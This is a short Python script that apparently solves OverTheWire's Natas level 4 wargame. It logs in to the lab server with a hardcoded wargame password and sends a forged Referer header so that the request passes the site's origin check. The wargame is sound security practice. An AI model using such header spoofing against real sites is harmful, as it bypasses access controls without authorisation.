import requests
URL = "http://natas4.natas.labs.overthewire.org/"

HEADER = {"Referer": "http://natas5.natas.labs.overthewire.org/"}
r = requests.get(URL, auth=('natas4', "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"), headers=HEADER)
print(r.text)